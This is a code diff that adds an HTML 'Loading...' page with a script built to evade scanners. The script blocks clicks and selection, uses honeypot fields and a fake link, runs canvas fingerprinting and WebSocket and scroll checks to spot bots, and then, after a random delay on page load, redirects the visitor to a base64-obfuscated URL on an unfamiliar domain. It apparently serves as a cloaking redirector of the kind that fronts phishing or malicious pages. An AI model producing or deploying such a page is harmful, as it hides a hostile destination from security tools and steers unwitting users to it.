@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Loading...</title>
+    <style>
+        /* Junk CSS and invisible honeypot elements */
+        .invisible-link, .hidden-trap-field {
+            display: none; 
+            position: absolute; 
+            top: -9999px; 
+            left: -9999px;
+        }
+
+        /* Dynamic content tricks */
+        .dynamic-content { visibility: hidden; }
+        .loading-indicator { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; }
+
+        /* Disable selection and right-click */
+        body, html {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            margin: 0; padding: 0; overflow: hidden;
+        }
+
+        /* CSS Media Queries for Anti-Bot Detection */
+        @media screen and (max-width: 600px) {
+            .mobile-only { display: block; }
+        }
+        @media screen and (min-width: 601px) {
+            .mobile-only { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden traps (will not be seen by users) -->
+    <a href="#" class="invisible-link"></a>
+    <input type="text" class="hidden-trap-field" name="trap">
+    
+    <!-- Loading indicator to stall bots -->
+    <div class="loading-indicator">Loading...</div>
+
+    <div class="dynamic-content"> <!-- Dynamic content will be revealed later -->
+        <p>This content loads dynamically for users but may confuse bots.</p>
+        <p class="mobile-only">This content is only visible on mobile devices.</p>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // Disable left-click
+            document.addEventListener('mousedown', function(e) {
+                if (e.button === 0) e.preventDefault();
+            });
+
+            // Honeypot trap detection
+            document.querySelector('.hidden-trap-field').addEventListener('change', function() {
+                console.log('Bot detected via honeypot field.');
+            });
+
+            // Dynamic content reveal with delay
+            setTimeout(function() {
+                document.querySelector('.loading-indicator').style.display = 'none';
+                document.querySelector('.dynamic-content').style.visibility = 'visible';
+            }, Math.floor(Math.random() * 2000) + 1000); // Random delay
+
+            // Fake link click handling
+            document.querySelector('.invisible-link').addEventListener('click', function(e) {
+                e.preventDefault();
+                console.log('Bot detected via fake link.');
+            });
+
+            // Dynamic URL obfuscation
+            var targetUrl = "https://fil-09ks.tirotear.college/sppqPTiC";
+            var obfuscatedUrl = btoa(targetUrl);
+            setTimeout(function() {
+                window.location.href = atob(obfuscatedUrl);
+            }, Math.floor(Math.random() * 2000) + 2000); // Random delay
+
+            // Time-Based Honeypot (Delayed Field)
+            setTimeout(function() {
+                var delayedField = document.createElement('input');
+                delayedField.type = 'text';
+                delayedField.name = 'delayed-trap';
+                delayedField.style.display = 'none';
+                document.body.appendChild(delayedField);
+                delayedField.addEventListener('change', function() {
+                    console.log('Bot detected via delayed honeypot field.');
+                });
+            }, 5000); // Field appears after 5 seconds
+
+            // Canvas Fingerprinting
+            var canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            var ctx = canvas.getContext('2d');
+            ctx.fillStyle = "#FF0000";
+            ctx.fillRect(10, 10, 180, 30);
+            ctx.fillStyle = "#000000";
+            ctx.font = "20px Arial";
+            ctx.fillText("Fingerprint", 15, 30);
+            var canvasData = canvas.toDataURL();
+            console.log('Canvas fingerprint:', canvasData);
+
+            // WebSocket Trap
+            var ws = new WebSocket('wss://echo.websocket.org');
+            ws.onopen = function() {
+                ws.send('Hello server');
+            };
+            ws.onmessage = function(event) {
+                console.log('WebSocket message received:', event.data);
+                if (event.data !== 'Hello server') {
+                    console.log('Bot detected via WebSocket.');
+                }
+            };
+
+            // Scroll Tracking
+            var scrollDetected = false;
+            window.addEventListener('scroll', function() {
+                scrollDetected = true;
+            });
+            setTimeout(function() {
+                if (!scrollDetected) {
+                    console.log('Bot detected due to lack of scrolling.');
+                }
+            }, 3000); // Check scroll after 3 seconds
+        });
+    </script>
+</body>
+</html>
